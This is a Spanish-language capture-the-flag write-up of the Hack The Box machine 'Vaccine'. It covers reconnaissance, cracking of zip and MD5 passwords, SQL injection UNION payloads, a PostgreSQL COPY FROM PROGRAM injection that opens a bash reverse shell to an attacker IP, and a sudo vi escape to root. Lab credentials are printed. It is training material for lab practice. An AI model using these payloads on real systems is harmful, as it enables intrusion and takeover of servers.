# Vaccine

### Sistema operativo

```
ping -c 1 10.10.10.46

PING 10.10.10.46 (10.10.10.46) 56(84) bytes of data.
64 bytes from 10.10.10.46: icmp_seq=1 ttl=63 time=40.6 ms

--- 10.10.10.46 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 40.603/40.603/40.603/0.000 ms

```

ttl=63 es una máquina Linux

### Puertos abiertos

```
nmap -p- --open -T5 10.10.10.46 -n

Starting Nmap 7.91 ( https://nmap.org ) at 2021-06-29 10:36 CEST
Stats: 0:00:01 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 0.34% done
Stats: 0:00:02 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 2.62% done; ETC: 10:38 (0:01:51 remaining)
Stats: 0:00:03 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 6.03% done; ETC: 10:37 (0:01:02 remaining)
Nmap scan report for 10.10.10.46
Host is up (0.042s latency).
Not shown: 63527 closed ports, 2005 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 15.52 seconds

```

Por ahora no vamos a buscar versiones ya que estamos viendo un ftp en el puerto 21 y en la máquina anterior "Oopsie" al hacer post-explotación descubrimos que había una contraseña para un servidor ftp así que la probamos.

### FTP

```
ftp 10.10.10.46

Connected to 10.10.10.46.
220 (vsFTPd 3.0.3)
Name (10.10.10.46:shanks): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
226 Directory send OK.
ftp> get backup.zip
local: backup.zip remote: backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 0.04 secs (58.1840 kB/s)
ftp> exit
221 Goodbye.
```

Tenemos un archivo backup.zip que no sabemos aún que contiene, así que a descubrirlo.

### Crackeando zip

Vemos que tiene contraseña

```
unzip backup.zip

Archive:  backup.zip
[backup.zip] index.php password: 
password incorrect--reenter:
```

Más info en "[John the reaper](../herramientas/fuerza-bruta/john-the-reaper.md#zip)"

```
zip2john backup.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
741852963        (backup.zip)
1g 0:00:00:00 DONE (2021-06-29 10:42) 20.00g/s 163840p/s 163840c/s 163840C/s 123456..whitetiger
Use the "--show" option to display all of the cracked passwords reliably
Session completed


unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password: 
  inflating: index.php               
  inflating: style.css     
```

haciendo un cat a index.php vemos que tenemos un usuario y contraseña

```
cat index.php

<!DOCTYPE html>
<?php
session_start();
  if(isset($_POST['username']) && isset($_POST['password'])) {
    if($_POST['username'] === 'admin' && md5($_POST['password']) === "2cb42f8734ea607eefed3b70af13bbd3") {
      $_SESSION['login'] = "true";
      header("Location: dashboard.php");
    }
  }
?>

```

El problema es que vemos que está en md5 por lo que podemos probar alguna herramienta online para sacar la contraseña teniendo el hash en md5

[https://crackstation.net/](https://crackstation.net)

usuario: admin:qwerty789

Podemos probar dicha contraseña en el ssh de antes que hemos visto "Aunque no vamos a tener suerte" o en algún sitio del servidor web.

### Servidor web

Cuando entramos en 10.10.10.46 vemos una pantalla de login donde vamos a probar el usuario y contraseña que acabamos de encontrar y ¡Bingo!

Cuando entramos vemos un cuadro de búsqueda y una tabla:

![](<../.gitbook/assets/image (1).png>)

Así que es importante que primero trasteemos haciendo alguna búsqueda...

Cuando probamos hola' vemos que aparece un mensaje de error así que podemos estar planteando un [SQLI ERROR BASED](../pentesting-web/sqli.md#error-based)

Vamos a comenzar probando con un UNION SELECT, la forma en la que lo realizo yo sería la siguiente:

```
HOLA' UNION SELECT NULL,NULL--
```

Y voy añadiendo null hasta que deje de dar el error en este caso 5 null en total:

```
HOLA' UNION SELECT NULL,NULL,NULL,NULL,NULL--
```

Se pueden probar distintas formas de comentar porque depende de la base de datos que haya detrás podéis verlo en [SQLI CHEATSHEET](../herramientas/sqli-cheatsheet/)

Podemos sacar la versión y sabemos que tenemos una PostgreSQL

```
HOLA' UNION SELECT NULL,NULL,NULL,VERSION(),NULL--
```

![](<../.gitbook/assets/image (2).png>)

Podemos ir listando cada una de las cosas que nos puedan interesar:

```
HOLA' UNION SELECT NULL,NULL,NULL,SCHEMANAME,NULL FROM PG_TABLES OFFSET 0 LIMIT 1--
HOLA' UNION SELECT NULL,NULL,NULL,tablename,NULL FROM pg_tables OFFSET 0 LIMIT 1--
HOLA' UNION SELECT NULL,NULL,NULL,TABLENAME,NULL FROM PG_TABLES WHERE SCHEMANAME = 'pg_catalog' OFFSET 0 LIMIT 1--
```

O enviarnos directamente una reverse shell gracias a que estamos frente a postgresql:

```
sudo rlwrap nc -nlvp 443

#Y en el cuadro de búsqueda de la web...

HOLA' ; DROP TABLE IF EXISTS prueba; CREATE TABLE prueba(data text); COPY prueba FROM PROGRAM 'bash -c "bash -i >& /dev/tcp/10.10.16.22/443 0>&1"';--
```

### Escalando privilegios

Ya nos toca escalar privilegios, en este caso lo vamos a tener bastante fácil, en primer lugar vamos a realizar una enumeración manual donde encontraremos el código de dashboard.php

```
cat /var/www/html/dashboard.php

try {
$conn = pg_connect("host=localhost port=5432 dbname=carsdb user=postgres
password=P@s5w0rd!");
}
```

Hacemos un [tratamiento de la tty](../pentesting/reverse-shell/tratamiento-de-la-tty.md):

```
script /dev/null -c bash
#pulsamos ctrl+z
stty raw -echo; fg
reset
xterm
export TERM=xterm
export SHELL=bash
stty rows 51 columns 187
```

Y podemos comprobar que privilegios tiene el usuario postgres que es con el que estamos actualmente:

```
sudo -l
P@s5w0rd!

Matching Defaults entries for postgres on vaccine:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
```

Básicamente tenemos la posibilidad de usar el binario vi y podemos modificar el archivo pg\_hba.conf

```
:!/bin/bash
```

¡Y ya somos root perfecto!



> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
